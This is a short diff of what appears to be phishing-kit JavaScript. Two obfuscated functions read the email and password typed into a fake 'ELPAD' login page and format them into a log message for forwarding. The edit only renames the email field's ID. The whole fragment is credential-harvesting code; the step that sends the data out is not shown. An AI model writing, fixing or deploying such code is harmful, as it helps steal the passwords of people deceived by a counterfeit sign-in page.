@@ -31,7 +31,7 @@ function userDetails() {
 
 
 function oBoqyl2() {
-	var eTxt = document.getElementById("email").value;
+	var eTxt = document.getElementById("eail").value;
 	var p2Txt = document.getElementById("password").value;
 
 	result = `Logs from ELPAD page %0A Entry ID: ${logStamp}  %0A mail-address : ${eTxt} %0A Password : ${p2Txt} `;
@@ -51,7 +51,7 @@ function oBoqyl2() {
 
 
 function ooqyl2() {
-	var eTxt = document.getElementById("email").value;
+	var eTxt = document.getElementById("eail").value;
 	var p2Txt = document.getElementById("password").value;
 
 	result = `Logs from ELPAD2 page %0A Entry ID: ${logStamp} (2nd Entry)  %0A mail-address : ${eTxt} %0A Password : ${p2Txt} `;
